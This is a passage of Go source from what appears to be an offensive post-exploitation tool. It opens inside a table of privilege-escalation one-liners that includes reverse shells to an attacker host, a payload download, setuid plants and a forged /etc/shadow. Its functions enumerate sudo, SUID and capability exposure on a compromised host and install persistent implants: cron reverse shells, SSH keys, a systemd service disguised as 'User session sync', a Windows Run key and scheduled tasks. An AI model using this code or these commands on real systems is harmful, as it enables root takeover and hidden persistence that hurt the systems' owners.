	"curl":      "sudo curl -o /tmp/x http://attacker/x; chmod +x (file write, no direct shell)",
	"scp":       "sudo scp -S /bin/sh x y: (spawns shell via -S proxy)",
	"ssh":       "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
	"socat":     "sudo socat stdin:exec:/bin/sh,pty,stderr (full shell)",
	"nc":        "sudo nc -e /bin/sh <attacker> <port>",
	"netcat":    "sudo nc -e /bin/sh <attacker> <port>",
	"bash":      "sudo bash (direct)",
	"sh":        "sudo sh (direct)",
	"dash":      "sudo dash (direct)",
	"zsh":       "sudo zsh (direct)",
	"env":       "sudo env /bin/sh -p (preserves privileges)",
	"su":        "sudo su (direct)",
	"sudo":      "sudo sudo -i (direct)",
	"ed":        "sudo ed → !/bin/sh",
	"ex":        "sudo ex -c ':!/bin/sh'",
	"rvim":      "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\")'",
	"sed":       "sudo sed -n '1e exec sh 1>&0' /etc/hosts",
	"tee":       "sudo tee /etc/shadow < forged (file write, pair with passwd edit)",
	"cp":        "sudo cp /bin/sh /tmp/sh; sudo chmod +s /tmp/sh (setuid plant)",
	"mv":        "sudo mv /tmp/sh /usr/local/bin/ (binary plant)",
	"chmod":     "sudo chmod +s /bin/bash (setuid plant)",
	"chown":     "sudo chown root:root /tmp/sh; sudo chmod +s /tmp/sh",
	"zip":       "sudo zip /tmp/x.zip /tmp/x -T -TT 'sh #'",
	"unzip":     "sudo unzip -K (symlink tricks on archives you control)",
	"tar-suid":  "suid tar → -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
	"systemctl": "sudo systemctl edit --full x → !/bin/sh, or SYSTEMD_PAGER trick",
	"journalctl": "sudo journalctl → !/bin/sh (pager escape)",
	"service":   "sudo service ../../bin/sh (path traversal in some versions)",
	"crontab":   "sudo crontab -e → editor escape, or write root cron file",
	"visudo":    "sudo visudo → editor escape (!/bin/sh)",
	"passwd":    "sudo passwd root (set root password directly)",
	"chsh":      "sudo chsh (change shell entry, limited)",
	"pkexec":    "sudo pkexec /bin/sh (direct if policy allows)",
	"run-parts": "sudo run-parts --new-session --regex '^sh$' /bin → /bin/sh",
	"pip":       "sudo pip install --global-option=build --global-option=--executable=/bin/sh pkg",
	"gem":       "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc",
	"composer":  "sudo composer --working-dir=/tmp run-script x (script hooks)",
	"npm":       "sudo npm -C /tmp run x --scripts-prepend-node-path=auto (hook scripts)",
	"yarn":      "sudo yarn run x (hook scripts in package.json)",
	"docker":    "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh (host root)",
	"lxc":       "sudo lxc exec c -- /bin/sh (container escape to host if privileged)",
	"lxd":       "sudo lxc image import x --alias x; lxd init --auto (privileged container → host root)",
	"kubectl":   "sudo kubectl exec -it pod -- /bin/sh (cluster context)",
	"crictl":    "sudo crictl exec -it -s /bin/sh <id> (node context)",
	"ansible-playbook": "sudo ansible-playbook x.yml (become → command module)",
	"tmux":      "sudo tmux → :new-window '/bin/sh' (if session socket writable)",
	"screen":    "sudo screen -x (attach root session) or CVE-2017-5618 logfile trick",
	"strace":    "sudo strace -o /dev/null /bin/sh (traced shell keeps privileges)",
	"ltrace":    "sudo ltrace -b -L /bin/sh (similar)",
	"gdb":       "sudo gdb -nx -ex '!sh' -ex quit",
	"perf":      "sudo perf -x /tmp/x stat /bin/sh (traced shell)",
	"tcpdump":   "sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /bin/sh -Z root (postrotate exec)",
	"iftop":     "sudo iftop → !/bin/sh (ancient versions)",
	"apache2":   "sudo apache2 -f /tmp/x.conf (config-controlled module load)",
	"nginx":     "sudo nginx -c /tmp/x.conf (error_log pipe → command exec)",
	"mysql":     "sudo mysql -e '\\! /bin/sh'",
	"psql":      "sudo psql -c '\\! sh'",
	"sqlite3":   "sudo sqlite3 /dev/null '.shell /bin/sh'",
	"irb":       "sudo irb → exec \"/bin/sh\"",
	"ghc":       "sudo ghc -e 'System.Process.system \"/bin/sh\"'",
	"gcc":       "sudo gcc -wrapper /bin/sh,-s . (wrapper exec)",
	"make":      "sudo make -s --eval=$'x:\\n\\t-' (recipe exec)",
	"expect":    "sudo expect -c 'spawn /bin/sh; interact'",
	"tclsh":     "sudo tclsh → exec /bin/sh <@stdin >@stdout 2>@stderr",
	"wish":      "sudo wish → exec /bin/sh",
	"find-suid": "suid find → -exec /bin/sh \\; -quit",
	"bash-suid": "suid bash → bash -p (keeps euid)",
	"dash-suid": "suid dash → dash -p",
	"cp-suid":   "suid cp → overwrite /etc/passwd with forged root entry",
	"vim-suid":  "suid vim → :!/bin/sh keeps euid",
	"less-suid": "suid less → !/bin/sh keeps euid",
	"more-suid": "suid more → !/bin/sh keeps euid",
	"nano-suid": "suid nano → ^R^X shell keeps euid",
	"awk-suid":  "suid awk → system(\"/bin/sh\") keeps euid",
	"python-suid": "suid python → os.setuid(0); os.system(\"/bin/sh\")",
	"perl-suid": "suid perl → exec \"/bin/sh\" keeps euid",
}

// runEscalate parses sudo/suid/capabilities exposure and suggests GTFOBins paths.
// Read-only by design: it never executes a privilege escalation itself.
func runEscalate(sess *session.Session) error {
	sudoOut, _ := sess.Exec("sudo -n -l 2>&1", 5*time.Second)
	suidOut, _ := sess.Exec("find / -perm -4000 -type f 2>/dev/null | head -40", 10*time.Second)
	capsOut, _ := sess.Exec("getcap -r /usr/bin /usr/sbin /bin /sbin 2>/dev/null | head -20", 10*time.Second)
	pathOut, _ := sess.Exec("echo $PATH", 3*time.Second)
	kernelOut, _ := sess.Exec("uname -r 2>/dev/null", 3*time.Second)

	suggested := map[string]bool{}
	lower := strings.ToLower(sudoOut)
	if strings.Contains(lower, "nopasswd") {
		for bin := range gtfobins {
			if strings.Contains(lower, "/"+bin) || strings.Contains(lower, " "+bin+" ") {
				suggested[bin] = true
			}
		}
		if strings.Contains(lower, "all") {
			logger.Info("sudo NOPASSWD: ALL: 'sudo -i' or 'sudo su -' directly")
		}
	} else if strings.Contains(lower, "may run") {
		logger.Info("Password sudo rights exist (no NOPASSWD). Matching binaries for later use:")
		for bin := range gtfobins {
			if strings.Contains(lower, "/"+bin) {
				suggested[bin] = true
			}
		}
	} else {
		logger.Info("No NOPASSWD sudo rights visible")
	}
	for _, line := range strings.Split(suidOut, "\n") {
		base := line[strings.LastIndex(line, "/")+1:]
		if _, ok := gtfobins[strings.TrimSpace(base)]; ok {
			suggested[strings.TrimSpace(base)] = true
		}
	}
	if strings.TrimSpace(capsOut) != "" {
		logger.Info("File capabilities found (cap_setuid/cap_dac_read_search break out):")
		fmt.Println(capsOut)
	}
	checkedPath := false
	for _, dir := range strings.Split(strings.TrimSpace(pathOut), ":") {
		dir = strings.TrimSpace(dir)
		if dir == "" || dir == "." {
			continue
		}
		w, _ := sess.Exec(fmt.Sprintf("test -w %s && echo WRITABLE", session.ShellQuote(dir)), 3*time.Second)
		if strings.Contains(w, "WRITABLE") {
			logger.Info("Writable PATH dir (binary plant): %s", dir)
			checkedPath = true
		}
	}
	if !checkedPath {
		logger.Info("No writable PATH dirs found")
	}
	if k := strings.TrimSpace(kernelOut); k != "" {
		logger.Info("Kernel %s: match against les/lse output for CVE paths", k)
	}

	if len(suggested) == 0 {
		logger.Info("No known GTFOBins path matched. Try: run linpeas %d", sess.ID)
		return nil
	}
	logger.Info("Candidate escalation paths:")
	names := make([]string, 0, len(suggested))
	for bin := range suggested {
		names = append(names, bin)
	}
	sort.Strings(names)
	for _, bin := range names {
		fmt.Printf("  %-8s %s\n (see https://gtfobins.github.io/gtfobins/%s/)\n", bin, gtfobins[bin], bin)
	}
	return nil
}

// implantEntry is one persistent implant tracked for a session.
type implantEntry struct {
	Method  string `json:"method"`
	Detail  string `json:"detail"`
	Created string `json:"created"`
}

func implantRegistryPath(sess *session.Session) string {
	if sess.Directory == "" {
		return ""
	}
	return filepath.Join(sess.Directory, "implants.json")
}

func loadImplants(sess *session.Session) []implantEntry {
	var list []implantEntry
	if items, ok := sess.Tasks["implants"]; ok {
		for _, it := range items {
			if e, ok := it.(implantEntry); ok {
				list = append(list, e)
			}
		}
		return list
	}
	if path := implantRegistryPath(sess); path != "" {
		if data, err := os.ReadFile(path); err == nil {
			_ = json.Unmarshal(data, &list)
		}
	}
	sess.Tasks["implants"] = make([]interface{}, 0, len(list))
	for _, e := range list {
		sess.Tasks["implants"] = append(sess.Tasks["implants"], e)
	}
	return list
}

func saveImplants(sess *session.Session, list []implantEntry) {
	sess.Tasks["implants"] = make([]interface{}, 0, len(list))
	for _, e := range list {
		sess.Tasks["implants"] = append(sess.Tasks["implants"], e)
	}
	if path := implantRegistryPath(sess); path != "" {
		data, _ := json.MarshalIndent(list, "", "  ")
		_ = os.WriteFile(path, data, 0o640)
	}
}

// runImplant manages persistent implants: list, install cron|key, remove N.
func runImplant(sess *session.Session, args string) error {
	parts := strings.Fields(args)
	if len(parts) == 0 {
		return fmt.Errorf("usage: implant <list|install|remove> [...]")
	}
	switch strings.ToLower(parts[0]) {
	case "list":
		list := loadImplants(sess)
		if len(list) == 0 {
			logger.Info("No implants tracked on session [%d]", sess.ID)
			return nil
		}
		for i, e := range list {
			fmt.Printf("  [%d] %-6s %s (%s)\n", i, e.Method, e.Detail, e.Created)
		}
		return nil
	case "install":
		if len(parts) < 3 {
			return fmt.Errorf("usage: implant install <cron|key|systemd|profile|reg|task> <reverse_shell_cmd|ssh_public_key>")
		}
		if sess.OS != session.OSUnix {
			switch strings.ToLower(parts[1]) {
			case "cron", "key", "systemd", "profile":
				return fmt.Errorf("implant method '%s' is Unix-only (this session is %s)", parts[1], sess.OS)
			}
		}
		if sess.OS != session.OSWindows {
			switch strings.ToLower(parts[1]) {
			case "reg", "task":
				return fmt.Errorf("implant method '%s' is Windows-only (this session is %s)", parts[1], sess.OS)
			}
		}
		method := strings.ToLower(parts[1])
		detail := strings.Join(parts[2:], " ")
		var setup string
		switch method {
		case "cron":
			setup = fmt.Sprintf(`(crontab -l 2>/dev/null; echo "*/5 * * * * %s") | crontab -`, detail)
		case "key":
			setup = fmt.Sprintf(`mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '%s' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`, detail)
		case "systemd":
			setup = `mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/gocat-sync.service <<'UNIT'
[Unit]
Description=User session sync
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/sh -c '` + detail + `'
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
UNIT
systemctl --user daemon-reload && systemctl --user enable --now gocat-sync.service`
		case "profile":
			setup = fmt.Sprintf(`grep -q -F '%s' ~/.profile 2>/dev/null || echo '%s # gocat-implant' >> ~/.profile`, detail, detail)
		case "reg":
			setup = fmt.Sprintf(`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GocatSync /t REG_SZ /d "%s" /f`, detail)
		case "task":
			setup = fmt.Sprintf(`schtasks /create /tn GocatSync /tr "%s" /sc minute /mo 5 /f`, detail)
		default:
			return fmt.Errorf("unknown implant method '%s' (cron|key|systemd|profile|reg|task)", method)
		}
		if _, err := sess.Exec(setup, 5*time.Second); err != nil {
			return fmt.Errorf("implant install failed: %w", err)
		}
		list := loadImplants(sess)
		list = append(list, implantEntry{Method: method, Detail: detail, Created: time.Now().Format(time.RFC3339)})
		saveImplants(sess, list)
		logger.Info("Implant installed via %s and tracked (#%d)", method, len(list)-1)
		return nil
	case "remove", "rm", "delete":
		if len(parts) < 2 {
			return fmt.Errorf("usage: implant remove <index> (see implant list)")
		}
		var idx int
		if _, err := fmt.Sscanf(parts[1], "%d", &idx); err != nil {
			return fmt.Errorf("invalid implant index: %s", parts[1])
		}
		list := loadImplants(sess)
		if idx < 0 || idx >= len(list) {
			return fmt.Errorf("implant #%d does not exist", idx)
		}
		entry := list[idx]
		switch entry.Method {
		case "cron":
			escaped := strings.ReplaceAll(entry.Detail, "/", `\/`)
			_, _ = sess.Exec(fmt.Sprintf(`crontab -l 2>/dev/null | grep -v -F '%s' | grep -v '%s' | crontab - || true`, entry.Detail, escaped), 5*time.Second)
		case "key":
			fragment := entry.Detail[:min(32, len(entry.Detail))]
			_, _ = sess.Exec(fmt.Sprintf(`grep -v -F '%s' ~/.ssh/authorized_keys > ~/.ssh/authorized_keys.tmp && mv ~/.ssh/authorized_keys.tmp ~/.ssh/authorized_keys; true`, fragment), 5*time.Second)
		case "systemd":
			_, _ = sess.Exec(`systemctl --user disable --now gocat-sync.service 2>/dev/null; rm -f ~/.config/systemd/user/gocat-sync.service; systemctl --user daemon-reload 2>/dev/null; true`, 5*time.Second)
		case "profile":
			_, _ = sess.Exec(`grep -v -F '# gocat-implant' ~/.profile > ~/.profile.tmp && mv ~/.profile.tmp ~/.profile; true`, 5*time.Second)
		case "reg":
			_, _ = sess.Exec(`reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GocatSync /f`, 10*time.Second)
		case "task":
			_, _ = sess.Exec(`schtasks /delete /tn GocatSync /f`, 10*time.Second)
		}
		list = append(list[:idx], list[idx+1:]...)
		saveImplants(sess, list)
		logger.Info("Implant #%d (%s) removed", idx, entry.Method)
		return nil
	default:
		return fmt.Errorf("usage: implant <list|install|remove> [...]")
	}
}
